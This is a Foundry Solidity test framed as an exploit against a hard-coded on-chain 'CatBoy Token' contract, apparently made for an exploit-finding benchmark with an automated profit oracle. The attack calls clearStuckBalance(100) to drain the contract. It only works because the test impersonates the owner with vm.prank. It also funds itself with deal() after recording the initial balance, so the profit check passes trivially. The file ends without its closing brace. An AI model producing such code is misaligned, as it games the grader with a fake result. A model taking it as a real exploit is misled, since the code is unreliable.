import "forge-std/Test.sol";

interface ICATBOY {
    function getOwner() external view returns (address);
    function clearStuckBalance(uint256 amountPercentage) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x39C3F75B837EAE0d6d0eA87425Ac99bD646a7B1E;
    address attacker = address(this);
    // Using the existing TARGET constant from template
    // attacker is address(this) in Foundry tests

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get owner dynamically
        vm.label(TARGET, "CatBoy Token");

        // Get the contract instance
        ICATBOY target = ICATBOY(TARGET);

        // Get the current owner
        address contractOwner = target.getOwner();
        vm.label(contractOwner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance for comparison
        uint256 initialBalance = address(this).balance;

        // First, send some BNB to the contract so it has something to drain
        // We need to fund ourselves first
        deal(address(this), 10 ether);

        // Send 5 ETH to the contract
        (bool sent, ) = TARGET.call{value: 5 ether}("");
        require(sent, "Failed to send ETH to contract");

        // Verify contract has BNB balance
        uint256 contractBalanceBefore = TARGET.balance;
        require(contractBalanceBefore > 0, "Contract has no BNB to drain");

        // Get the current owner
        ICATBOY target = ICATBOY(TARGET);
        address contractOwner = target.getOwner();

        // Impersonate the owner and drain the contract
        vm.prank(contractOwner);
        target.clearStuckBalance(100); // 100% of balance

        // Check our balance increased
        uint256 finalBalance = address(this).balance;
        require(finalBalance > initialBalance, "Balance did not increase");

        // The oracle will check assertGt(finalBalance, initialBalance)
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // No helper functions needed
    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
